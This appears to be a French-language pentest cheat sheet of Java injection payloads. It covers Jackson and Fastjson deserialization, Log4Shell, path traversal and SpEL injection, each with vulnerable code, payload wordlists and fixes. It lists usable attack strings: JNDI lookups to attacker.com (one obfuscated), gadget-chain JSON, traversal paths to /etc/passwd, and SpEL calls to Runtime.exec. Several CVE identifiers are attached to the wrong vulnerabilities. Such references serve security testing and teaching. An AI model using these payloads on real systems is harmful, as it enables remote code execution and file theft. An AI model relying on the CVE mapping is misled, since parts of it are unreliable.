# JAVA

- Payloads d’injection endpoints Java (boîte blanche)
  - CVE-2017-7525 (Jackson Désérialisation)
    - Description : Exécution de code via désérialisation non sécurisée d’objets JSON avec Jackson.
    - Versions vulnérables : Jackson < 2.9.5
    - Exemples de code vulnérable :
      ```
      ObjectMapper mapper = new ObjectMapper();
      Object obj = mapper.readValue(jsonInput, Object.class);
      ```
      ```
      @PostMapping("/parse")
      public void parse(@RequestBody String json) throws Exception {
          Object obj = mapper.readValue(json, Object.class);
      }
      ```
    - Wordlist d’attributs :
      - `@class`
      - `dataSourceName`
      - `autoCommit`
      - `driverClassLoader`
      - `driverClassName`
    - Payloads :
      ```
      {
        "@class": "com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName": "rmi://attacker.com:1099/Exploit",
        "autoCommit": true
      }
      ```
      ```
      {
        "@class": "org.apache.commons.dbcp2.BasicDataSource",
        "driverClassLoader": "com.sun.org.apache.bcel.internal.util.ClassLoader",
        "driverClassName": "org.apache.bcel.util.JavaWrapper",
        "url": "bcel://..."
      }
      ```
    - Correctif approprié :
      - Mettre à jour Jackson ≥ 2.9.5
      - Restreindre les types autorisés à la désérialisation
  - CVE-2021-44228 (Log4Shell)
    - Description : Injection JNDI via les logs Log4j permettant une exécution de code à distance.
    - Versions vulnérables : Log4j 2.0 à 2.14.1
    - Exemples de code vulnérable :
      ```
      logger.error("Erreur : " + userInput);
      ```
      ```
      log.info(request.getParameter("search"));
      ```
    - Wordlist de payloads :
      - `${jndi:ldap://attacker.com/a}`
      - `${jndi:rmi://attacker.com/a}`
      - `${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}`
    - Correctif approprié :
      - Mettre à jour Log4j ≥ 2.15.0
      - Désactiver la résolution JNDI dans la configuration
  - CVE-2016-8735 (Path Traversal File Upload)
    - Description : Téléversement de fichier avec contournement de chemin permettant d’écraser des fichiers sensibles.
    - Versions vulnérables : Applications Java utilisant un traitement naïf des chemins
    - Exemples de code vulnérable :
      ```
      String filename = request.getParameter("filename");
      FileOutputStream fos = new FileOutputStream("/uploads/" + filename);
      ```
      ```
      @PostMapping("/upload")
      public void upload(@RequestParam String name, InputStream file) throws IOException {
          Files.copy(file, Paths.get("/data/" + name));
      }
      ```
    - Wordlist de payloads :
      - `../../../../etc/passwd`
      - `..\\..\\..\\..\\windows\\win.ini`
      - `/etc/passwd`
      - `C:\Windows\win.ini`
    - Correctif approprié :
      - Valider et normaliser les chemins de fichiers
      - Interdire les séquences `../` et `..\\`
  - CVE-2018-1270 (Spring Data REST SpEL Injection)
    - Description : Injection SpEL dans les paramètres de requête permettant l’exécution de code.
    - Versions vulnérables : Spring Data Commons < 1.13.11, < 2.0.6, < 2.1.4
    - Exemples de code vulnérable :
      ```
      @RequestParam String sort
      repository.findAll(Sort.by(Sort.Order.by(sort)));
      ```
      ```
      @GetMapping("/search")
      public List<User> search(@RequestParam String expr) {
          ExpressionParser parser = new SpelExpressionParser();
          return userRepository.findByExpr(parser.parseExpression(expr).getValue());
      }
      ```
    - Wordlist de payloads :
      - `T(java.lang.Runtime).getRuntime().exec('id')`
      - `new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('ls').getInputStream()).next()`
    - Correctif approprié :
      - Mettre à jour Spring Data Commons
      - Désactiver l’évaluation SpEL sur les paramètres utilisateur
  - CVE-2019-12384 (Fastjson Désérialisation)
    - Description : RCE via la désérialisation de types arbitraires avec Fastjson.
    - Versions vulnérables : Fastjson < 1.2.68
    - Exemples de code vulnérable :
      ```
      JSON.parseObject(input, Object.class);
      ```
      ```
      @PostMapping("/fastjson")
      public void fastjson(@RequestBody String json) {
          Object obj = JSON.parseObject(json, Object.class);
      }
      ```
    - Wordlist d’attributs :
      - `@type`
      - `driverClassLoader`
      - `driverClassName`
      - `url`
    - Payloads :
      ```
      {
        "@type": "org.apache.commons.dbcp2.BasicDataSource",
        "driverClassLoader": "com.sun.org.apache.bcel.internal.util.ClassLoader",
        "driverClassName": "org.apache.bcel.util.JavaWrapper",
        "url": "bcel://..."
      }
      ```
    - Correctif approprié :
      - Mettre à jour Fastjson ≥ 1.2.68
      - Désactiver la désérialisation automatique des types
